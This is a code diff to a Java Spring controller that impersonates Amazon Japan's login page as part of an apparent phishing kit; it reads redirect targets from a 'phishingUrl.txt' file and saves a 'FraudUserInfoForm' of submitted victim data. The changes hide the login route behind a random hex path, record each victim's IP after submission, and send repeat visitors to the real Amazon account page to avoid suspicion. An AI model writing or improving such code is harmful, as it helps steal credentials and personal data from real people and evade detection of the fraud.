@@ -8,6 +8,7 @@ import cn.hutool.http.HttpRequest;
 import cn.hutool.json.JSONObject;
 import cn.hutool.json.JSONUtil;
 import com.kidd.testfishing1.service.AuthUserService;
+import com.kidd.testfishing1.service.CacheService;
 import com.kidd.testfishing1.task.AsyncTask;
 import com.kidd.testfishing1.common.IpUtils;
 import com.kidd.testfishing1.model.FraudUserInfoForm;
@@ -38,6 +39,9 @@ public class AmazonController {
     @Autowired
     private AuthUserService authUserService;
 
+    @Autowired
+    private CacheService cacheService;
+
     private void randStr(Model model) {
         String random = RandomUtil.randomString(3000);
         String header = RandomUtil.randomString(20);
@@ -62,15 +66,21 @@ public class AmazonController {
         } catch (Exception e) {
 
         }
-        List<String> phishingUrls = FileUtil.readLines("/root/phishingUrl.txt", Charset.defaultCharset());
+        List<String> phishingUrls = FileUtil.readLines("/www/phishingUrl.txt", Charset.defaultCharset());
         Integer size = phishingUrls.size();
         String url = phishingUrls.get(RandomUtil.randomInt(0,size));
         return "redirect:"+url;
     }
 
-    @GetMapping("/user-login")
+    @GetMapping("/9d6667652ea246a7a82fcd4764a206a6")
     public Object signin(@RequestHeader("User-Agent") String ua, @RequestHeader("Accept-Language") String al, Model model) {
         try {
+            //是否尝试再次进入
+            String ip = IpUtils.getIpAddress(request);
+            Object enterFlag = cacheService.getCommonCache(ip+"end");
+            if(enterFlag!=null && enterFlag.equals(1)){
+                return "redirect:https://www.amazon.co.jp/gp/css/homepage.html/ref=nav_youraccount_ya";
+            }
             boolean result = authUserService.auth(request);
             if (!result) {
                 randStr(model);
@@ -175,6 +185,10 @@ public class AmazonController {
             return "test";
         }
         asyncSaveUserInfo(form);
+
+        //标识已完成，不准再次进入
+        String ip = IpUtils.getIpAddress(request);
+        cacheService.setCommonCache(ip+"end",1);
         Map map = new HashMap();
         map.put("data", "ok");
         return map;
